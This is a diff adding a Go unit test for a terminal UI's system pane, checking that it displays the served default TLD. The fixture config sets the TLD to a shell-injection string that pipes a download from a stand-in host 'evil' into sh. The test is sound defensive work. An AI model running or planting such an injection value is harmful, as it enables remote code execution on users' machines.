@@ -1,9 +1,13 @@
 package tui
 
 import (
+	"os"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"testing"
+
+	"github.com/gabriel-sousa99/lerd/internal/dns"
 )
 
 // TestSystemRows_ContainsCoreSections checks every section header the system
@@ -127,4 +131,31 @@ func TestSystemRows_DumpsInfoShowsBufferedCount(t *testing.T) {
 	if !strings.Contains(bufferedRow.value, "2 events") {
 		t.Errorf("expected 'Buffered: 2 events', got %q", bufferedRow.value)
 	}
+}
+
+// The TUI must name the suffix the dnsmasq config was written from. Showing the
+// raw dns.tld left the pane claiming a TLD nothing serves, and probing it left
+// the status permanently down (#1559).
+func TestSystemRows_ShowsTheServedTLD(t *testing.T) {
+	cfgHome := t.TempDir()
+	t.Setenv("XDG_CONFIG_HOME", cfgHome)
+	t.Setenv("XDG_DATA_HOME", t.TempDir())
+	dir := filepath.Join(cfgHome, "lerd")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	body := "dns:\n  enabled: false\n  tld: \"bad'; curl http://evil/x | sh; #\"\n"
+	if err := os.WriteFile(filepath.Join(dir, "config.yaml"), []byte(body), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	for _, r := range NewModel("test").systemRows() {
+		if r.kind == sysInfo && r.label == "TLD" {
+			if r.value != dns.DefaultTLD {
+				t.Errorf("TLD row shows %q, but the writer serves %q", r.value, dns.DefaultTLD)
+			}
+			return
+		}
+	}
+	t.Fatal("no TLD row in the system pane")
 }
